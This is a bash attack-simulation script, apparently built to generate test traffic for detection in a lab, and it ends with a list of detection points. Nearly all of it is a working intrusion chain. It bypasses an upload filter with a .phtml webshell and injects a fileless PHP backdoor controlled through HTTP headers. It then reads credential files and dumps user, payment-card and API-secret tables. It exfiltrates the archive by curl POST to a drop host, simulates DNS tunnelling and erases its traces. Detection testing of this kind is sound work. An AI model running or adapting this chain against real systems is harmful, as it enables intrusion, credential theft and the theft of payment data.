#!/bin/bash
# ============================================================
# Data Exfiltration + Fileless Memory WebShell (Direct IP)
# (数据外泄 + 内存马 攻击链 — 直连 IP 版)
#
# WARNING: Lab-only attack simulation script.
#          Do NOT run against unauthorized targets.
#
# Covered scenarios: S7 (data exfiltration / reverse tracing), S5 (host anomaly)
# Targets: 91 (Web+MemShell /exfil/) → 92 (MySQL + C2 listener :8443)
# WAF: network-layer / cloud (not host-simulated)
# C2: Memory WebShell — payload in /dev/shm/ (tmpfs), commands via HTTP headers
#     Initial uploaded WebShell deleted after memory shell injection (fileless)
# Usage: bash attack.sh [WEB_IP] [WEB_PORT]
# ============================================================

set +e

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/lab-safety.sh"

# ---------- 配置 ----------
WEB_IP="${1:-10.66.6.91}"
WEB_PORT="${2:-80}"
WEB_URL="http://${WEB_IP}:${WEB_PORT}"
INIT_SHELL="s.phtml"

DB_HOST="10.66.6.92"
DB_USER="app_user"
DB_PASS="app_pass_2024"
DB_NAME="prod_db"

DROP_IP="10.66.6.92"
DROP_PORT="8443"

P="/exfil"
MEM_TOKEN="c2token2024"
MEM_SESS=".sess_$(head -c 6 /dev/urandom | xxd -p)"

lab_require_attack_target "${WEB_IP}" || exit $?
lab_require_attack_target "${DB_HOST}" || exit $?
lab_require_attack_target "${DROP_IP}" || exit $?

# ---------- 工具函数 ----------
INIT_CMD()  { curl -s "${WEB_URL}${P}/uploads/${INIT_SHELL}?c=$1"; }
HTTP()      { curl -s -o /dev/null -w '%{http_code}' "$@"; }

# 内存马 C2 通道
MEM_CMD() {
    local cmd="$1"
    local endpoint="${2:-${WEB_URL}${P}/upload.php}"
    local encoded=$(echo -n "$cmd" | base64 -w0)
    local resp=$(curl -s \
        -H "X-Forwarded-Port: ${MEM_TOKEN}|${encoded}" \
        -H "X-Real-IP: body" \
        "$endpoint")
    echo "$resp" | sed -n 's/.*<!--MEM:\([A-Za-z0-9+/=]*\):MEM-->.*/\1/p' | base64 -d
}

log()  { echo -e "\033[1;34m[*]\033[0m $*"; }
ok()   { echo -e "\033[1;32m[+]\033[0m $*"; }
fail() { echo -e "\033[1;31m[-]\033[0m $*"; }
hdr()  { echo -e "\n\033[1;33m========== $* ==========\033[0m"; }

# ---------- PHASE 1: 正常流量 ----------
phase1_normal_traffic() {
    hdr "PHASE 1: 正常业务流量"
    HTTP -H "User-Agent: Mozilla/5.0 Chrome/126.0" "${WEB_URL}${P}/"
    HTTP -H "User-Agent: Mozilla/5.0 Safari/605.1" "${WEB_URL}${P}/"
    HTTP -H "User-Agent: Mozilla/5.0 Firefox/128.0" "${WEB_URL}${P}/uploads/"
    HTTP "${WEB_URL}/favicon.ico"
    ok "正常流量注入完成 (4 请求)"
}

# ---------- PHASE 2: 目标侦察 ----------
phase2_recon() {
    hdr "PHASE 2: 目标侦察"

    log "应用指纹识别"
    curl -sI "${WEB_URL}${P}/" 2>/dev/null | grep -iE "^(Server|X-Powered-By):" | head -3
    ok "服务器指纹已获取"

    log "页面结构探测 — 发现文件上传表单"
    curl -s "${WEB_URL}${P}/" | grep -oE '(href|action|enctype)="[^"]*"' | sort -u | head -10
    ok "页面入口点已枚举"

    log "上传目录探测"
    local dir_code
    dir_code=$(HTTP "${WEB_URL}${P}/uploads/")
    if [ "$dir_code" = "200" ]; then
        ok "上传目录可列目录 (HTTP $dir_code) — 信息泄露"
    fi

    log "上传功能参数探测"
    HTTP -X POST "${WEB_URL}${P}/upload.php"
    ok "上传端点已确认"
}

# ---------- PHASE 3: 文件上传探测 + 初始立足点 ----------
phase3_upload_probe() {
    hdr "PHASE 3: 文件上传探测"

    log "Step 1: 正常文件上传 (.jpg)"
    echo "legitimate image content" > "/tmp/_exfil_test.jpg"
    curl -s -F "file=@/tmp/_exfil_test.jpg;type=image/jpeg" "${WEB_URL}${P}/upload.php" > /dev/null
    ok "正常上传测试完成"

    log "Step 2: 尝试 .php 上传（应被拦截）"
    echo '<?php echo "test"; ?>' > "/tmp/_exfil_test.php"
    curl -s -F "file=@/tmp/_exfil_test.php;type=application/x-php" "${WEB_URL}${P}/upload.php" > /dev/null
    local code
    code=$(HTTP "${WEB_URL}${P}/uploads/_exfil_test.php")
    if [ "$code" = "404" ] || [ "$code" = "403" ]; then
        ok ".php 上传被拦截 — 存在后缀过滤"
    fi

    log "Step 3: .phtml 绕过"
    echo '<?php echo "<pre>".shell_exec($_GET["c"])."</pre>"; ?>' > "/tmp/_exfil_${INIT_SHELL}"
    curl -s -o /dev/null -F "file=@/tmp/_exfil_${INIT_SHELL};filename=${INIT_SHELL};type=image/jpeg" "${WEB_URL}${P}/upload.php"

    log "Step 4: 验证初始 WebShell"
    local ws_result
    ws_result=$(INIT_CMD "id")
    if echo "$ws_result" | grep -q "uid="; then
        ok "初始 WebShell 活跃 (仅用于内存马植入，随后删除)"
    else
        fail "WebShell 植入失败"; exit 1
    fi

    ok "文件上传探测完成"
}

# ---------- PHASE 4: 内存马植入 + 无文件化 ----------
phase4_memshell_inject() {
    hdr "PHASE 4: 内存马植入 + 无文件化"

    log "Step 1: 生成内存马载荷"
    local MEMSHELL_PHP
    MEMSHELL_PHP='<?php
if(isset($_SERVER["HTTP_X_FORWARDED_PORT"])){
  $p=explode("|",$_SERVER["HTTP_X_FORWARDED_PORT"]);
  if(count($p)===2 && $p[0]==="'"${MEM_TOKEN}"'"){
    $c=base64_decode($p[1]);
    $o=shell_exec($c." 2>&1");
    if(isset($_SERVER["HTTP_X_REAL_IP"]) && $_SERVER["HTTP_X_REAL_IP"]==="body"){
      echo "<!--MEM:".base64_encode($o).":MEM-->";
    }
  }
}
?>'
    local B64_SHELL=$(echo -n "$MEMSHELL_PHP" | base64 -w0)

    log "Step 2: 写入 /dev/shm/${MEM_SESS} (tmpfs 内存文件系统，不落盘)"
    INIT_CMD "echo+${B64_SHELL}+|+base64+-d+>+/dev/shm/${MEM_SESS}"
    local check
    check=$(INIT_CMD "ls+-la+/dev/shm/${MEM_SESS}")
    if echo "$check" | grep -q "${MEM_SESS}"; then
        ok "内存马载荷已写入 /dev/shm/"
    else
        fail "内存马写入失败"; return 1
    fi

    log "Step 3: 通过 Python 注入 @include 到 upload.php"
    local INJECT_PY
    INJECT_PY="import sys
path = sys.argv[1]
with open(path) as fh:
    lines = fh.readlines()
lines.insert(1, '@include(\"/dev/shm/${MEM_SESS}\");\n')
with open(path, 'w') as fh:
    fh.writelines(lines)
print('INJECTED: ' + path)"
    local B64_INJPY=$(echo -n "$INJECT_PY" | base64 -w0)
    INIT_CMD "echo+${B64_INJPY}+|+base64+-d+>+/dev/shm/.inject.py"
    INIT_CMD "python3+/dev/shm/.inject.py+/var/www/html/exfil/upload.php"

    log "Step 4: 验证内存马 C2 通道"
    local mem_result
    mem_result=$(MEM_CMD "echo MEMSHELL_ACTIVE")
    if echo "$mem_result" | grep -q "MEMSHELL_ACTIVE"; then
        ok "内存马 C2 通道已建立"
    else
        fail "内存马验证失败"
    fi

    log "Step 5: 删除初始 WebShell — 实现无文件化"
    INIT_CMD "rm+-f+/var/www/html/exfil/uploads/${INIT_SHELL}"
    local shell_check
    shell_check=$(HTTP "${WEB_URL}${P}/uploads/${INIT_SHELL}")
    if [ "$shell_check" = "404" ]; then
        ok "初始 WebShell 已删除 — 攻击转入无文件阶段"
    fi

    log "Step 6: 清理注入脚本"
    MEM_CMD "rm -f /dev/shm/.inject.py" > /dev/null

    ok "内存马植入完成"
    echo ""
    echo "    载荷位置: /dev/shm/${MEM_SESS} (tmpfs, 不落盘, 重启消失)"
    echo "    注入点: upload.php 第2行 @include"
    echo "    C2通道: X-Forwarded-Port 请求头, 响应嵌入 HTML 注释"
    echo "    可见文件: 无 (初始 WebShell 已删除)"
}

# ---------- PHASE 5: 凭证发现 (通过内存马) ----------
phase5_cred_discovery() {
    hdr "PHASE 5: 凭证发现 (通过内存马)"

    log "搜索配置文件"
    MEM_CMD "find /var/www/html/exfil -name '*.yml' -o -name '*.conf' -o -name '*.env' 2>/dev/null"

    log "读取数据库配置"
    MEM_CMD "cat /var/www/html/exfil/config/database.yml"

    log "系统信息"
    MEM_CMD "id"
    MEM_CMD "hostname"

    ok "凭证发现完成"
}

# ---------- PHASE 6: 数据库查询 (通过内存马) ----------
phase6_db_query() {
    hdr "PHASE 6: 数据库敏感查询 (通过内存马)"

    log "查询用户表"
    MEM_CMD "mysql -h ${DB_HOST} -u${DB_USER} -p${DB_PASS} ${DB_NAME} -e 'SELECT username,email,role FROM users'"

    log "查询支付卡表"
    MEM_CMD "mysql -h ${DB_HOST} -u${DB_USER} -p${DB_PASS} ${DB_NAME} -e 'SELECT card_number,cvv,holder_name FROM payment_cards'"

    log "查询服务凭证表"
    MEM_CMD "mysql -h ${DB_HOST} -u${DB_USER} -p${DB_PASS} ${DB_NAME} -e 'SELECT service_name,api_key,secret FROM credentials'"

    ok "敏感数据查询完成"
}

# ---------- PHASE 7: 数据导出打包 (通过内存马) ----------
phase7_dump_and_pack() {
    hdr "PHASE 7: 数据导出打包 (通过内存马)"

    log "mysqldump 导出"
    MEM_CMD "bash -c 'mysqldump -h ${DB_HOST} -u${DB_USER} -p${DB_PASS} ${DB_NAME} users payment_cards credentials > /tmp/.dump.sql 2>&1 && echo DUMP_OK'"

    log "检查 dump 大小"
    MEM_CMD "ls -la /tmp/.dump.sql"

    log "打包压缩"
    MEM_CMD "bash -c 'tar czf /tmp/.data.tar.gz -C /tmp .dump.sql 2>&1 && echo TAR_OK'"
    MEM_CMD "ls -la /tmp/.data.tar.gz"

    ok "数据打包完成"
}

# ---------- PHASE 8: 数据外传 (通过内存马 → 数据收集点) ----------
phase8_exfiltrate() {
    hdr "PHASE 8: 数据外传 (通过内存马 → 数据收集点)"

    log "curl POST 外传打包数据"
    MEM_CMD "curl -s -X POST --data-binary @/tmp/.data.tar.gz http://${DROP_IP}:${DROP_PORT}/upload"

    ok "数据外传完成"
}

# ---------- PHASE 9: DNS 隧道模拟 (通过内存马) ----------
phase9_dns_tunnel() {
    hdr "PHASE 9: DNS 隧道模拟 (通过内存马)"

    local -a encoded_data=(
        "dXNlcm5hbWU9YWRtaW4"
        "cGFzc3dvcmQ9YWRtaW5AMjAyNCE"
        "Y2FyZD00MTExLTExMTEtMTExMS0xMTEx"
        "Y3Z2PTEyMw"
        "YXBpX2tleT1BS0lBNXRFeGFtcGxl"
        "c2VjcmV0PXdKYWxyWFV0bkZFTUk"
        "ZW5kX29mX2V4Zmls"
    )

    for chunk in "${encoded_data[@]}"; do
        MEM_CMD "curl -s http://${DROP_IP}:${DROP_PORT}/dns/${chunk}" > /dev/null
        sleep 0.3
    done

    ok "DNS 隧道模拟完成 (${#encoded_data[@]} 分片外传)"
}

# ---------- PHASE 10: 清理痕迹 (通过内存马) ----------
phase10_cleanup() {
    hdr "PHASE 10: 痕迹清理 (通过内存马)"
    MEM_CMD "rm -f /tmp/.dump.sql /tmp/.data.tar.gz"
    ok "痕迹清理完成"
}

# ---------- PHASE 11: 攻击后正常流量 ----------
phase11_post_normal() {
    hdr "PHASE 11: 攻击后正常流量"
    HTTP -H "User-Agent: Mozilla/5.0 Chrome/126.0" "${WEB_URL}${P}/"
    HTTP -H "User-Agent: Mozilla/5.0 Safari/605.1" "${WEB_URL}${P}/"
    HTTP "${WEB_URL}/favicon.ico"
    ok "正常流量注入完成"
}

# ---------- 主流程 ----------
main() {
    trap 'rm -f /tmp/_exfil_* 2>/dev/null' EXIT

    echo ""
    echo "  ╔═══════════════════════════════════════════════════════════╗"
    echo "  ║  数据外泄 + 内存马 攻击链                                   ║"
    echo "  ║  上传探测 → .phtml初始立足点 → 内存马注入 → 删除WebShell      ║"
    echo "  ║  → 无文件化 → DB窃取 → 数据外传 → DNS隧道                   ║"
    echo "  ╚═══════════════════════════════════════════════════════════╝"
    echo ""

    hdr "连接检查"
    local code
    code=$(HTTP "${WEB_URL}${P}/")
    if [ "$code" = "200" ]; then
        ok "Web靶机 ${WEB_URL} 可达"
    else
        fail "Web靶机不可达 ($code)"; exit 1
    fi

    local start_time=$SECONDS

    phase1_normal_traffic
    phase2_recon
    phase3_upload_probe
    phase4_memshell_inject
    phase5_cred_discovery
    phase6_db_query
    phase7_dump_and_pack
    phase8_exfiltrate
    phase9_dns_tunnel
    phase10_cleanup
    phase11_post_normal

    local elapsed=$(( SECONDS - start_time ))

    echo ""
    hdr "攻击链执行完毕"
    ok "耗时: ${elapsed}s"
    ok "攻击路径:"
    ok "  正常流量 → 侦察 → 上传探测(.php拦截 → .phtml绕过)"
    ok "  → 内存马植入(/dev/shm/ + @include) → 删除初始WebShell"
    ok "  → 凭证发现(database.yml, via内存马) → DB查询(via内存马)"
    ok "  → mysqldump → 数据外传(via内存马→收集点) → DNS隧道"
    echo ""
    echo "  内存马检测要点:"
    echo "    /dev/shm/ 存在可疑 PHP 文件 (${MEM_SESS})"
    echo "    upload.php 被注入 @include 行"
    echo "    HTTP 流量中 X-Forwarded-Port 头含异常 base64 内容"
    echo "    无文件阶段: 上传目录无可疑文件，所有操作通过内存马执行"
    echo "    数据外传: PHP进程(nginx用户)发起 MySQL/curl 连接"
    echo ""
    echo "  反向追溯验证点 (S7):"
    echo "    检测点: audit-port-execmon 记录 php-fpm 子进程执行 mysql/curl/tar"
    echo "    追溯: curl POST → tar czf → mysqldump → cat database.yml"
    echo "    隐蔽性: C2 流量在 80 端口，混入正常 Web 流量"
    echo ""
}

main "$@"
